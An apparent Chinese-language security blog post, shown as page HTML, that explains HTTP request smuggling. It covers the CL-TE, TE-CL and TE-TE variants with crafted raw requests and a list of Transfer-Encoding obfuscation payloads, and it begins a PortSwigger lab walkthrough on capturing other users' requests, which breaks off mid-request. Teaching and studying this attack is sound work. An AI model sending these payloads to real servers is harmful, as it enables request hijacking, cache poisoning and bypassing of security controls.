

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.svg">
  <link rel="icon" href="/img/icon.svg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="litt1e-ice">
  <meta name="keywords" content="">
  
    <meta name="description" content="漏洞成因keep-alive 与 pipeline为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 Keep-Alive 和 Pipeline 特性：  所谓 Keep-Aliv">
<meta property="og:type" content="article">
<meta property="og:title" content="http请求走私">
<meta property="og:url" content="http://litt1e-ice.github.io/2024/11/24/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
<meta property="og:site_name" content="litt1e-ice&#39;s blog">
<meta property="og:description" content="漏洞成因keep-alive 与 pipeline为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 Keep-Alive 和 Pipeline 特性：  所谓 Keep-Aliv">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101523-500cdf7a-722c-1.png">
<meta property="og:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101550-5fd56a12-722c-1.png">
<meta property="og:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101632-7930b9f8-722c-1.png">
<meta property="og:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101659-890c0224-722c-1.png">
<meta property="og:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101711-90608860-722c-1.png">
<meta property="article:published_time" content="2024-11-24T05:13:03.000Z">
<meta property="article:modified_time" content="2024-11-24T05:24:21.392Z">
<meta property="article:author" content="litt1e-ice">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://litt1e-ice.github.io/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101523-500cdf7a-722c-1.png">
  
  
  
  <title>http请求走私 - litt1e-ice&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"litt1e-ice.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>litt1e-ice&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="http请求走私"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-11-24 13:13" pubdate>
          2024年11月24日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          27 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">http请求走私</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="keep-alive-与-pipeline"><a href="#keep-alive-与-pipeline" class="headerlink" title="keep-alive 与 pipeline"></a>keep-alive 与 pipeline</h3><p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 <code>Keep-Alive</code> 和 <code>Pipeline</code> 特性：</p>
<blockquote>
<p>所谓 Keep-Alive，就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。</p>
<p>有了 Keep-Alive 之后，后续就有了 Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循<strong>先入先出</strong>机制，将请求和响应严格对应起来，再将响应发送给客户端。现如今，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipleline 的支持。</p>
</blockquote>
<p>在正常情况下用户发出的 HTTP 请求的流动如下图：</p>
<p><img src="/./http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101523-500cdf7a-722c-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在整个过程中，最关键的是<strong>前置服务器和后端服务器应当在 HTTP 请求的边界划分上达成一致</strong>，否则就会导致下图所示的异常：</p>
<p><img src="/./http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101550-5fd56a12-722c-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>当我们向代理服务器发送一个比较<strong>模糊</strong>的 HTTP 请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个 HTTP 请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了 HTTP 走私攻击。</p>
</blockquote>
<p>那么如何让 HTTP 请求变得“模糊”呢？长度！</p>
<h3 id="CL-与-TE"><a href="#CL-与-TE" class="headerlink" title="CL 与 TE"></a>CL 与 TE</h3><p>CL 和 TE 即是 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 请求头（严格来讲前者是个实体头，为了方便就都用请求头代指）。这里比较有趣的是 <code>Transfer-Encoding</code>（HTTP&#x2F;2 中不再支持），指定用于传输请求主体的编码方式，可以用的值有 chunked&#x2F;compress&#x2F;deflate&#x2F;gzip&#x2F;identity ，完整的定义在 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#Directives">Transfer-Encoding#Directives</a> 和 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc2616#section-3.6">rfc2616#section-3.6</a>，这里我们只关注 <code>chunked</code> 。</p>
<blockquote>
<p><code>chunked</code>: Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by ‘\r\n’ and then the chunk itself, followed by another ‘\r\n’. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of entity header fields.</p>
</blockquote>
<p>设置了 <code>Transfer-Encoding: chunked</code> 后，请求主体按一系列块的形式发送，并将省略 <code>Content-Length</code>。在每个块的开头需要用十六进制数指明当前块的长度，数值后接 <code>\r\n</code>（占 2 字节），然后是块的内容，再接 <code>\r\n</code> 表示此块结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[chunk size]</span><span class="hljs-selector-attr">[\r\n]</span><span class="hljs-selector-attr">[chunk data]</span><span class="hljs-selector-attr">[\r\n]</span><span class="hljs-selector-attr">[chunk size]</span><span class="hljs-selector-attr">[\r\n]</span><span class="hljs-selector-attr">[chunk data]</span><span class="hljs-selector-attr">[\r\n]</span><span class="hljs-selector-attr">[chunk size = 0]</span><span class="hljs-selector-attr">[\r\n]</span><span class="hljs-selector-attr">[\r\n]</span><br></code></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-stylus"><span class="hljs-selector-tag">b</span></span><br><span class="language-stylus">q=smuggling</span><br><span class="language-stylus"><span class="hljs-number">6</span></span><br><span class="language-stylus">hahaha</span><br><span class="language-stylus"><span class="hljs-number">0</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[空白行]</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[空白行]</span></span><br></code></pre></td></tr></table></figure>

<p>这里我想啰嗦一句，有的文章为了提醒读者 <code>\r\n</code> 的存在，就写成了如下形式：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript">POST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: <span class="hljs-number">1.com</span><span class="hljs-string">\r\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-string">\r\n</span><br>Transfer-Encoding: chunked<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br>b<span class="hljs-string">\r\n</span><br>q=smuggling<span class="hljs-string">\r\n</span><br><span class="hljs-number">6</span><span class="hljs-string">\r\n</span><br>hahaha<span class="hljs-string">\r\n</span><br><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure>

<p>作为我们工地的抬杠冠军，我觉得这样表述不太严谨。刚开始学习的时候看上面这种就误以为 <code>\r\n</code> 之后再接一次 CRLF，所以怎么都算不对长度（菜到流泪）…..所以要显式写出 <code>\r\n</code> 的话，应该写作</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: <span class="hljs-number">1.</span>com\r\nContent-<span class="hljs-name">Type</span>: application/x-www-form-urlencoded\r\nTransfer-<span class="hljs-name">Encoding</span>: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n<br></code></pre></td></tr></table></figure>

<p>害，反正长度算不清楚的时候去 Burp 里看 Hex 模式就好了，<code>\r\n</code> 是 <code>0d 0a</code>。</p>
<p>在计算长度时有一些需要注意的原则：</p>
<ol>
<li><code>Content-Length</code> 需要将<strong>请求主体中的 \r\n</strong> 所占的 2 字节计算在内，而块长度要忽略块内容末尾表示终止的 <code>\r\n</code></li>
<li>请求头与请求主体之间有一个空行，是规范要求的结构，并不计入 <code>Content-Length</code></li>
</ol>
<p>至此，可以看到有两种方式用来表示 HTTP 请求的内容长度： <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 。为了避免歧义，<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4">rfc2616#section-4.4</a> 中规定当这两个同时出现时，<code>Content-Length</code> 将被忽略。</p>
<blockquote>
<p>3.If a Content-Length header field (<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc2616#section-14.13">section 14.13</a>) is present, its decimal value in OCTETs represents both the entity-length and the transfer-length. The Content-Length header field MUST NOT be sent if these two lengths are different (i.e., if a Transfer-Encoding header field is present). <strong>If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored</strong>.</p>
</blockquote>
<p>设立规范的老师傅们考虑的很周到，但不是所有的 Web 服务器（中间件）都严格遵守规范，就会导致不同的服务器在请求的边界划分上产生分歧，从而导致了请求走私漏洞。比如：</p>
<ol>
<li>CL-TE：前置服务器认为 <code>Content-Length</code> 优先级更高（或者根本就不支持 <code>Transfer-Encoding</code> ） ，后端认为 <code>Transfer-Encoding</code> 优先级更高</li>
<li>TE-CL：前置服务器认为 <code>Transfer-Encoding</code> 优先级更高，后端认为 <code>Content-Length</code> 优先级更高（或者不支持 <code>Transfer-Encoding</code> ）</li>
<li>TE-TE：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但可以通过混淆让它们在处理时产生分歧</li>
</ol>
<h2 id="走私方式"><a href="#走私方式" class="headerlink" title="走私方式"></a>走私方式</h2><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><blockquote>
<p>实验：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
</blockquote>
<p>前置服务器认为 <code>Content-Length</code> 优先级更高（或者根本就不支持 <code>Transfer-Encoding</code> ） ，后端认为 <code>Transfer-Encoding</code> 优先级更高。</p>
<p>举个栗子，假如发送的请求如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-css"><span class="hljs-number">0</span></span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">A</span></span><br></code></pre></td></tr></table></figure>

<p>前置服务器根据 <code>Content-Length: 6</code> 判断出这是一个完整的请求，于是整体转发到后端服务器，但后端根据 <code>Transfer-Encoding: chunked</code> 将请求主体截断到 <code>0\r\n\r\n</code> 并认为一个完整的请求结束了，最后剩下的 A 就被认为是下一个请求的一部分，留在缓冲区中等待剩余的请求。如果此时其他用户此时发送了一个 GET 请求，就会与 A 拼接成一个畸形的 AGET，造成服务器解析异常：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">AGET / HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-symbol">Host:</span> <span class="hljs-number">1.</span><span class="hljs-keyword">com</span><br>....<br></code></pre></td></tr></table></figure>

<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><blockquote>
<p>实验：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
</blockquote>
<p>TE-CL：前置服务器认为 <code>Transfer-Encoding</code> 优先级更高，后端认为 <code>Content-Length</code> 优先级更高（或者不支持 <code>Transfer-Encoding</code> ）。</p>
<p>以如下请求为例：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac7f1f821ea8d83280cc5eda009200f6.web-security-academy.net<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-apache"><span class="hljs-attribute">17</span></span><br><span class="language-apache"><span class="hljs-attribute">POST</span> /rook1e HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">0</span><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-apache">[空白行]</span><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-apache">[空白行]</span></span><br></code></pre></td></tr></table></figure>

<p>前置服务器将其分块传输，其实就一个长度为 17 的块 <code>POST /rook1e HTTP/1.1\r\n</code>，但后端服务器根据 <code>Content-Length: 4</code> 截取到 <code>17\r\n</code> 即认为是一个完整的请求，剩下的留在缓冲区中等待剩余内容，若此时由用户发送了一个 GET，即被拼接成了一个 POST &#x2F;rook1e 走私请求。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rook1e</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-routeros">0</span><br><span class="language-routeros"></span><br><span class="language-routeros"><span class="hljs-built_in">GET</span> / HTTP/1.1</span><br><span class="language-routeros"><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span></span><br></code></pre></td></tr></table></figure>

<p>连发两次包，可以发现后端服务器找不到 &#x2F;rook1e 而返回 404。</p>
<p><img src="/./http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101632-7930b9f8-722c-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><blockquote>
<p>实验：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
</blockquote>
<p>TE-TE：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但可以通过混淆让它们在处理时产生分歧，其实也就是变成了 CL-TE 或 TE-CL。</p>
<p>比如如下请求，前置和后端服务器可能对 TE 这个不规范的请求头的处理产生分歧：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">1</span>.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Transfer</span>-Encoding[空格]: chunked<br><br><span class="hljs-attribute">5c</span><br><span class="hljs-attribute">GPOST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span><br><br><span class="hljs-attribute">x</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">0</span><span class="hljs-meta"></span><br><span class="hljs-meta">[空白行]</span><span class="hljs-meta"></span><br><span class="hljs-meta">[空白行]</span><br></code></pre></td></tr></table></figure>

<p>PortSwigger 给出了一些可用于混淆的 payload：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Transfer</span>-Encoding: xchunked<br><br><span class="hljs-built_in">Transfer</span>-Encoding[空格]: chunked<br><br><span class="hljs-built_in">Transfer</span>-Encoding: chunked<br><span class="hljs-built_in">Transfer</span>-Encoding: x<br><br><span class="hljs-built_in">Transfer</span>-Encoding:[tab]chunked<br><br>[空格]<span class="hljs-built_in">Transfer</span>-Encoding: chunked<br><br>X: X[\n]<span class="hljs-built_in">Transfer</span>-Encoding: chunked<br><br><span class="hljs-built_in">Transfer</span>-Encoding<br>: chunked<br></code></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>以上是 PortSwigger 列举的攻击方式，另外还有 @Regilero 大佬的更多姿势：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3">https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3</a></li>
<li><a target="_blank" rel="noopener" href="https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4">https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4</a></li>
<li><a target="_blank" rel="noopener" href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7</a></li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>PortSwigger 举了一些栗子，懂了上面说的三个走私方式基本就会了：</p>
<ul>
<li>绕过前置服务器的安全限制</li>
<li>获取前置服务器修改过的请求字段</li>
<li>获取其他用户的请求</li>
<li>反射型 XSS 组合拳</li>
<li>将 on-site 重定向变为开放式重定向</li>
<li>缓存投毒</li>
<li>缓存欺骗</li>
</ul>
<p>其中有的利用条件是很苛刻的，师傅们已经讲的很清楚了，我就不重复了。实验环境在 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP request smuggling vulnerabilities</a>，师傅们的分析在 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#5">https://paper.seebug.org/1048/#5</a> 和 <a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Attack-Surface">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Attack-Surface</a> ，油管一小哥制作的视频演示 <a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4">https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4</a> 。</p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>用一个实验环境来分析：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">通过 HTTP 请求走私获取其他用户的请求内容（Exploiting HTTP request smuggling to capture other users’ requests）</a> 。</p>
<p>已知可用 <code>CL-TE</code> 方式，comment 的内容会显示在网页上，所以攻击者可以尝试走私一个发布评论的请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ace31f621e3458058060015600db0052.web-security-academy.net<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span 